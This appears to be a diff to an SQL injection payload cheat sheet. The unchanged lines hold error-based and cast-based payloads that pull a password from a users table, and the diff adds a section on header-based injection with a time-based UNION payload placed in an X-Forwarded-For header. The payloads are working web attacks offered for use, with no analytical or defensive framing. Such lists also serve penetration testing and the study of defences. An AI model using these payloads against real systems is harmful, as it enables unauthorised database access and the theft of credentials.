@@ -168,3 +168,8 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 
 '||cast((select password from users LIMIT 1) AS INT)--
 
+
+#HTTP Header based SQLi
+
+x-forwarded-for: 127.0.0.1' union select 1,2,3 and sleep(2)-- -
+
